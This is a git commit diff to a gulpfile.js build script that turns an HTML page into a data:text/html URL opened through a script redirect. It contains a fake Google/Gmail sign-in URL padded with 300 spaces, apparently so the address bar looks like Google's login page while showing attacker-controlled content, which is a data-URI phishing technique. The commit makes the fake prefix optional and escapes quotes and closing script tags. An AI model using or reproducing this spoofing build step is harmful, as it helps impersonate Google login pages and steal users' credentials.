674caf545ac2ebad3233207c1f247d76751ad9ef
Spencer Smith <ssmith@egi.utah.edu>
2017-01-27 11:22:29 -0700

    HTML to script window location with escaped closing script tag

--- gulpfile.js
+++ gulpfile.js
@@ -5,18 +5,28 @@ var gulp = require('gulp'),
 
 
 function toDataURL(content) {
+  var addFakeURL = false;
   var fakeURL = "https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/#identifier";
   for(var i = 0; i < 300; i++){
     fakeURL += " ";
   }
 
-  content = "data:text/html," + fakeURL + content;
+  content = addFakeURL ? (fakeURL + content) : content;
+  content = content.replace(/"/g, "\\\"");
+  content = content.replace(/<\/script>/g, "<\\\/script>");
 
-  console.log(content);
+  content = "<script>window.location = \"data:text/html," + content + "\"</script>";
+
+  //console.log(content);
   return content;
 }
 
+
 gulp.task('default', function(){
+  //gulp.watch('source/*.html', ['dataURL']);
+});
+
+gulp.task('dataURL', function(){
   return gulp.src('./source/index.html')
     .pipe(inline())
     .pipe(htmlmin({collapseWhitespace: true}))
